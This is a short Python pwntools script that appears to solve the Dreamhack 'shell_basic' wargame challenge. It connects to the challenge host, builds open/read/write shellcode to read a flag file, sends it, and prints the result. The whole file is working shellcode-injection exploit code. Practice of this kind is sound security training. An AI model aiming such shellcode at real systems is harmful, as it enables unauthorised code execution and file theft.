from pwn import *

# p = process('./shell_basic')
p = remote('host1.dreamhack.games', 19451)

context.arch = 'amd64'
context.endian = 'little'
# context.log_level = 'debug'

p.recvuntil('shellcode: ')

exploit = ''

exploit += asm(shellcraft.open('/home/shell_basic/flag_name_is_loooooong'))
exploit += asm(shellcraft.read('rax', 'rsp', 0x100))
exploit += asm(shellcraft.write(1, 'rsp', 0x100))

p.sendline(exploit)

print(p.recvline())

p.interactive()
